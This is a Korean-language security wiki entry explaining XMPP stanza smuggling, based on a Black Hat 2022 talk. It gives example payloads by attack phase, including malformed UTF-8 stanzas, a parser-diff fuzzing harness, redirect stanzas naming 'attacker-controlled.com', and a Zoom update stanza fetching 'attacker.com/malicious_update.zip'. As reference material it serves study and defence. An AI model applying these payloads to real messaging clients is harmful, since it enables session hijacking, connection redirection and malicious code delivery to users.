---
title: XMPP_Stanza_Smuggling
description: 
published: true
date: 2025-07-31T13:06:34.787Z
tags: parser difference fingerprinting, processing instruction obfuscation, embedded stanza fragment injection, utf‑8 encoding mismatch, parsing discrepancy verification, connection redirect (mitm), custom extension abuse, token beacon exfiltration
editor: markdown
dateCreated: 2025-07-20T11:12:05.222Z
---

# XMPP Stanza Smuggling

## 개요
“XMPP Stanza Smuggling”은 XMPP 프로토콜의 메시지 단위인 스탠자(Stanza)에 대한 클라이언트, 서버 간 처리 기준 차이를 악용하는 기법이다. 클라이언트는 단일 XML 스탠자로 인식하지만 서버는 이를 복수 스탠자로 해석하는 경계 구분 방식 차이로 인해, 인증 우회나 제3자 세션 탈취가 가능하다. 이 불일치는 XMPP 서버 구현체(ejabberd, Prosody, Openfire 등)와 클라이언트 라이브러리의 XML 파서 처리 차이에서 비롯되며, 주로 WebSocket 기반 XMPP 연결에서 발생한다. 공격자는 메시지 일부를 잘게 쪼개거나, 비정상적인 XML 태그 조합을 통해 클라이언트가 보내는 정상 메시지 내부에 은닉된 스탠자를 삽입할 수 있으며, 이를 통해 인증 메시지를 우회하거나 메시지 릴레이 구조를 조작할 수 있다. 최종적으로 인증 우회, 사용자 세션 탈취, 메시지 위변조 등 심각한 보안 영향을 초래한다.


## 분류

> 구문 분석 불일치 (Syntax Parsing Gap)  
> → 데이터 경계 파싱 불일치 (Boundary Parsing Mismatch)  
> → XMPP Stanza Smuggling

## 절차

<table>
  <thead>
    <tr>
      <th>Phase</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Reconnaissance</td>
      <td>서버측 ejabberd/fast_xml과 클라이언트측 Gloox·Smack 파서를 조사해 UTF‑8 처리, 네임스페이스 구분, <code>&lt;?xml&gt;</code> 해석 규칙 등이 어떻게 다른지 찾아낸다.</td>
    </tr>
    <tr>
      <td>Obfuscation</td>
      <td>멀티바이트·Zero‑Width·널 바이트·URL 인코딩 등으로 페이로드를 난독화해 필터·로깅 탐지를 우회한다.</td>
    </tr>
    <tr>
      <td>Divergence</td>
      <td>변종 stanza를 전송해 서버는 정상으로 처리하지만 클라이언트 파서는 다른 구조로 재해석하도록 만들어서 권한 상승·메시지 스푸핑 조건을 만든다.</td>
    </tr>
    <tr>
      <td>Validation</td>
      <td>자동 테스트 스크립트와 로그 비교, 실제 클라이언트 화면 확인 등을 통해 파서 불일치가 정말 일어났는지 검증한다.</td>
    </tr>
    <tr>
      <td>Exploitation</td>
      <td>검증된 stanza로 세션 탈취, 악성 도메인으로 리다이렉트, 0‑click RCE 등 실질적 공격을 수행한다.</td>
    </tr>
    <tr>
      <td>Exfiltration</td>
      <td>리다이렉트된 클라이언트가 보내는 업데이트 요청·쿠키·토큰을 Beacon/WebSocket으로 공격자 서버에 모은다.</td>
    </tr>
  </tbody>
</table>

<div style="text-align: left;">
  <img
    src="/xmpp_stanza_smuggling.png"
    alt="XMPP Stanza Smuggling 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격 기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Parser Difference Fingerprinting</td>
      <td>
        <pre><code> &lt;message&gt;
      &lt;body&gt;\xEB\x3C\x3E&lt;/body&gt;
  &lt;/message&gt; </code>
      </td>
      <td>멀티바이트 UTF‑8 시퀀스(0xEB 0x3C 0x3E)가 서버·클라이언트 파서에서 다르게 해석되는 점을 이용해, 사용 중인 XML 파서를 식별한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Obfuscation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Processing Instruction Obfuscation</td>
      <td><pre> <code>&lt;aaa0xEB/&gt;&lt;?0xEB?&gt;&lt;xml&gt;&lt;iq&gt;ping&lt;/iq&gt;&lt;/xml&gt;</code> </pre>삽입</td>
      <td>Processing Instruction(<code>&lt;?foo?&gt;</code>)와 XML 태그(<code>&lt;?xml?&gt;&lt;xml&gt;</code>)를 결합해 클라이언트 파서 상태를 리셋함으로써, 숨겨진 Stanza를 우회하여 삽입한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Divergence

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Embedded Stanza Fragment Injection</td>
      <td>
        <pre><code>&lt;message&gt;
    &lt;body&gt;hello&lt;foo&gt;bar&lt;/foo&gt;&lt;/body&gt;
&lt;/message&gt;</code>
			</td>
      <td>본문에 <code>&lt;foo&gt;</code> 태그를 삽입해, 서버는 이를 단일 Stanza로 처리하지만 클라이언트 파서는 별도 Stanza로 해석하여 파싱하게 만든다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>UTF‑8 Encoding Mismatch</td>
      <td>
        <pre><code>&lt;message&gt;
    &lt;body&gt;&lt;aaa&#xEB;/&gt;&lt;/body&gt;
&lt;/message&gt;</code>
      </td>
      <td>서버(Expat)와 클라이언트(Gloox) 파서가 잘못된 UTF‑8 바이트 시퀀스를 다르게 해석한다. 서버는 단일 태그로 인식하지만, 클라이언트는 여러 Stanza로 분리하여 해석하게 만든다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Parsing Discrepancy Verification</td>
      <td>
        <pre><code>void ProcessSample(const char *data, size_t size) {
  string message(data, size);
  message = string("&lt;message&gt;") + message + string("&lt;/message&gt;");
  std::string reparsed;
  if(!fastxml_reparse(message.data(), message.size(), &reparsed))
    return;
  gloox::TagHandler th;
  gloox::Parser gloox_parser(&th);
  int gloox_ret = gloox_parser.feed(reparsed);
  if(gloox_ret >= 0) {
    crash[0] = 1;
  }
}</code></pre>
      </td>
      <td>자동화된 Fuzzing 스크립트와 로그 비교 및 클라이언트 화면 확인을 통해 파서 불일치가 실제 발생하는지 검증한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Custom Error Stanza Redirect Exploitation</td>
      <td> <pre> <code>&lt;stream:error&gt;
      &lt;revoke-token reason='1' web-domain='...'/&gt;
  &lt;/stream:error&gt;</code></td>
      <td>악성 <code>&lt;stream:error&gt;</code> 스탠자를 삽입해 클라이언트를 공격자 도메인으로 리다이렉트하고, 세션 탈취·인증 우회를 실행한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Connection Redirect (MitM)</td>
      <td>
        <pre><code>&lt;stream:error&gt;
  &lt;revoke-token reason='1' web-domain='attacker-controlled.com'/&gt;
&lt;/stream:error&gt;</code></pre>
      </td>
      <td><code>see-other-host</code>과 같은 표준 에러 스탠자나 애플리케이션의 커스텀 리디렉션 Stanza를 통해 피해자 클라이언트의 연결을 공격자가 제어하는 서버로 강제 전환시켜 중간자 공격을 수행한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Custom Extension Abuse</td>
      <td>
        <pre><code>&lt;!-- Zoom's custom stanza to force an update check from a malicious server --&gt;
&lt;clusterswitch&gt;
  &lt;releasenotes svr_url="http://attacker.com/malicious_update.zip" /&gt;
&lt;/clusterswitch&gt;</code></pre>
      </td>
      <td>서버에서만 사용되어야 할 애플리케이션의 비공개 또는 커스텀 XMPP 확장 기능을 클라이언트에 직접 전송한다. 클라이언트의 자동 업데이트 메커니즘을 조작하거나 숨겨진 기능을 트리거하여 의도치 않은 동작을 유발한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Token Beacon Exfiltration</td>
      <td>
        <pre><code>27 {
 1: us04xmpp1.zoom.us
 2: us04gateway.zoom.us
 3: us04gateway-s.zoom.us
 4: us04file.zoom.us
 5: us04xmpp1.zoom.us
 6: us04xmpp1.zoom.us
 7: us05polling.zoom.us
 8: us05log.zoom.us
 10: us04file-ia.zoom.us
 11: us04as.zoom.us
 12: us05web.zoom.us
 …
 23: zmail.asynccomm.zoom.us
}</code></pre>
      </td>
      <td>리다이렉트된 클라이언트의 `/clusterswitch` HTTP 요청에서 쿠키·세션 토큰·사용자 입력 데이터를 수집하여 공격자 서버로 전송한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

---

## 분류에 해당하는 문서
- [1] https://i.blackhat.com/USA-22/Thursday/US-22-Fratric-XMPP-Stanza-Smuggling.pdf

